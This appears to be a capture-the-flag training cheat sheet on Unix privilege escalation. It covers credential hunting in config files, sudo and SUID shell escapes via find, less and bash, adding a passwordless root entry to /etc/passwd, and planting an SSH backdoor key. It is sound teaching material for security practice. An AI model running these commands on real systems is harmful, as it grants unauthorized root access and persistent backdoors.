

<!--- category: PrivEscUx --->
<!--- id: intro --->
<!--- title: Privilege Elevation - Unix --->
<!--- keywords:  --->
## Privilege Elevation - Unix

Privilege elevation techniques for Unix.



<!--- category: PrivEscUx --->
<!--- id: privelev --->
<!--- title: Principle --->
<!--- keywords:  --->
## Principle

You just got shell access to a server. 
Let start by an exhaustive inventory of what is accessible to your account.<br/>
- Identify the OS, its version, the missing security patches
- List available tools: netcat, python, perl...
- Read all config, temporary, backup files to find login/password.<br/>
- Use the possible sudo rights of the account.<br/>
- Find commands with SetUID bit.<br/>
- Find a process running in the background with root rights and modify its inputs.<br/>
- Find a kernel exploit. This last option, radical because it can crash the machine, is very efficient on old servers...

On your first servers, it is preferable to make these enumerations by launching the commands manually, so you can appropriate the options and outputs. Once comfortable, and knowing what you are looking for, feel free to use scripts that do these enumerations for you.



<!--- category: PrivEscUx --->
<!--- id: section --->
<!--- title: Files containing usefull informations --->
<!--- keywords:  --->
## Files containing usefull informations



<!--- category: PrivEscUx --->
<!--- id: fichiers --->
<!--- title: Find readables files --->
<!--- keywords:  --->
## Find readables files

Find .txt or .cfg files, owned by other accounts, and readable.
```
find /home -readable -type f  \( -iname \*.txt -o -iname \*.cfg \) 2>/dev/null
find /home -E . -regex '.*\.(txt|cfg)' 2>/dev/null
```
  



<!--- category: PrivEscUx --->
<!--- id: wordpress --->
<!--- title: Web app: Wordpress --->
<!--- keywords:  --->
## Web app: Wordpress

Wordpress config file is:
```
wp-config.php
```
    
Let find it:
 ```
find /var -name wp-config.php 2>/dev/null
```

This config file contains login/password used to connect to the blog database. By dumping the database, it's thus possible to get wordpress user's login and password hashes.



<!--- category: PrivEscUx --->
<!--- id: apache --->
<!--- title: Web server: Apache --->
<!--- keywords:  --->
## Web server: Apache

Apache config file name may be :
```
httpd.conf
apache2.conf
```
    
On le trouve généralement dans un des répertoires:
```
/etc/apache2/httpd.conf
/etc/apache2/apache2.conf
/etc/httpd/httpd.conf
/etc/httpd/conf/httpd.conf
```




<!--- category: PrivEscUx --->
<!--- id: tomcat --->
<!--- title: Web server: Tomcat --->
<!--- keywords:  --->
## Web server: Tomcat

Tomcat config file is named:
```
server.xml
```
 
User's accounts can be found in :
```
tomcat-users.xml
```
 
Thos files are usually found in:
```
TOMCAT-HOME/conf/
/usr/local/tomcat/conf/
```




<!--- category: PrivEscUx --->
<!--- id: section --->
<!--- title: Sudo --->
<!--- keywords:  --->
## Sudo



<!--- category: PrivEscUx --->
<!--- id: sudo --->
<!--- title: Sudo --->
<!--- keywords:  --->
## Sudo

Sudo is used to run commands as another user.<br/>
<br/>
To know the sudo rights of your account, you have to run the command sudo -l. Sometimes you are asked to enter your password.
```
sudo -l
The user1 can use the following commands on target-host:
    (ALL) NOPASSWD: /usr/bin/find
    user2 NOPASSWD: /usr/bin/python3 /home/user2/run.py
```


The first entry is: (ALL) NOPASSWD: /usr/bin/find    
It is possible to run the /usr/bin/find command as any server user, especially root.     
```
sudo /usr/bin/find  
```

    
Second entry is: user2 NOPASSWD: /usr/bin/python3 /home/user2/run.py     
Here it is possible to run the command '/usr/bin/python3 /home/user2/run.py' as user2.    
For this we use the 'sudo' command with the '-u user22' flag
```
sudo -u user2 /usr/bin/python3 /home/user2/run.py 
```


If the NOPASSWD option is set, you do not have to enter any passwords. Otherwise, the sudo command asks for the password of the current account. If you are logged in via a webshell, or an ssh connection with private key, you will have to figure out the password.    



<!--- category: PrivEscUx --->
<!--- id: section --->
<!--- title: SetUID bit --->
<!--- keywords:  --->
## SetUID bit



<!--- category: PrivEscUx --->
<!--- id: setUID --->
<!--- title: SetUID bits --->
<!--- keywords:  --->
## SetUID bits

Identify processes with a setUID bit
```
find / -perm -4000 -exec ls -al {} \; 2>/dev/null
```

What to do with a binary having a setUID bit ?
```
- Run a shell
- Read a flag
- Copy a file
- Add an entry in a file : /etc/sudoers, /etc/passwd, ~/.ssh/authorized_keys
- ...
```




<!--- category: PrivEscUx --->
<!--- id: section --->
<!--- title: SUID/Sudo exploitation --->
<!--- keywords:  --->
## SUID/Sudo exploitation



<!--- category: PrivEscUx --->
<!--- id: shell --->
<!--- title: Process to allowing to launch a shell --->
<!--- keywords:  --->
## Process to allowing to launch a shell

Many processes allow to launch a shell. Perfect with sudo or a setUID bit.
```
- find
- nmap
- vi
- less
- awk
- tee
...
```

Reference: https://gtfobins.github.io/



<!--- category: PrivEscUx --->
<!--- id: less --->
<!--- title: Sudo/SUID bit - less --->
<!--- keywords:  --->
## Sudo/SUID bit - less

Less is used to read files. Press q to exit.
```
./less flag.txt
```

To open a shell, open a file, then !/bin/sh
```
./less fichier
!/bin/sh
```




<!--- category: PrivEscUx --->
<!--- id: privbash --->
<!--- title: Sudo/SUID bit - bash --->
<!--- keywords:  --->
## Sudo/SUID bit - bash

Launched thanks sudo or with SUID bit set, bash drops its privileges. To keep root id, use -p option.
```
bash -p
```




<!--- category: PrivEscUx --->
<!--- id: findsh --->
<!--- title: Sudo/SUID bit - find --->
<!--- keywords:  --->
## Sudo/SUID bit - find

To open a shell, find a known file then launch the command: /bin/sh.
```
sudo /usr/bin/find . -name readme.txt -exec /bin/sh \;
./find . -name readme.txt -exec /bin/sh \;



<!--- category: PrivEscUx --->
<!--- id: etcpasswd --->
<!--- title: Add a password less account with root rights --->
<!--- keywords:  --->
## Add a password less account with root rights

If you have the rights to modify /etc/passwd, you can be root. For example tee with a sudo as root.
Add an entry with a UID of 0 (root UID), and an empty password.
```
echo myroot::0:0:::/bin/bash | sudo tee -a /etc/passwd 
su myroot 
```




<!--- category: PrivEscUx --->
<!--- id: pubkey --->
<!--- title: Create an ssh backdoor by adding a public key. --->
<!--- keywords:  --->
## Create an ssh backdoor by adding a public key.

```
echo 'ssh-rsa AAAAB3[...]CHN2CpQ== yolo@yolospacehacker.com' > /home/victim/.ssh/authorized_keys
ssh -i id_rsa victim@iptarget
```




<!--- category: PrivEscUx --->
<!--- id: section --->
<!--- title: Process exploitation --->
<!--- keywords:  --->
## Process exploitation



<!--- category: PrivEscUx --->
<!--- id: ps --->
<!--- title: ps --->
<!--- keywords:  --->
## ps

Identify processes running as root 
```
ps eaxf
```

Once an interresting process found, see if it's possible to modify the files read by the process, or if the process has known vulnerabilities.



<!--- category: PrivEscUx --->
<!--- id: cron --->
<!--- title: Cron --->
<!--- keywords:  --->
## Cron

Identify cron tasks.
```
cat /etc/cron.d/*
cat /var/spool/cron/*
crontab -l
cat /etc/crontab
cat /etc/cron.(time)
systemctl list-timers
```




<!--- category: PrivEscUx --->
<!--- id: process --->
<!--- title: Process Spy --->
<!--- keywords:  --->
## Process Spy

With the ps command, you may miss a small process, launched every 2 minutes, which will process a batch file in 5 seconds before disappearing.
The pspy tool monitors the processes for you.
```
https://github.com/DominicBreuker/pspy
```




<!--- category: PrivEscUx --->
<!--- id: section --->
<!--- title: Kernel exploit --->
<!--- keywords:  --->
## Kernel exploit



<!--- category: PrivEscUx --->
<!--- id: os --->
<!--- title: Kernel exploit --->
<!--- keywords:  --->
## Kernel exploit

Linux Distib version:
```
cat /etc/issue
Ubuntu 18.04.3 LTS 
```

Linux kernel version: 5.0.0-37-generic
```
uname -a
Linux yoloctf-server 5.0.0-37-generic #40~18.04.1-Ubuntu SMP Thu Nov 14 12:06:39 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

Once the kernel version is known, it is possible to search for a kernel exploit<br/>
https://github.com/SecWiki/linux-kernel-exploits<br/>
Never run an unknown binary !<br/>
Get the sources, read them, understand what they do, compile yourself, and only then run them... Knowing that there is a high risk of crashing the server.



<!--- category: PrivEscUx --->
<!--- id: section --->
<!--- title: Enumeration scripts --->
<!--- keywords:  --->
## Enumeration scripts



<!--- category: PrivEscUx --->
<!--- id: linenum --->
<!--- title: Enum scripts --->
<!--- keywords:  --->
## Enum scripts

Some well known script automate the enumeration process.<br/>
Test them and find the one that suits you best.
```
linPeass : https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
LinEnum.sh : https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
linuxprivchecker.py : https://github.com/sleventyeleven/linuxprivchecker
unixprivesc.sh : https://github.com/pentestmonkey/unix-privesc-check
lse.sh : https://github.com/diego-treitos/linux-smart-enumeration
```


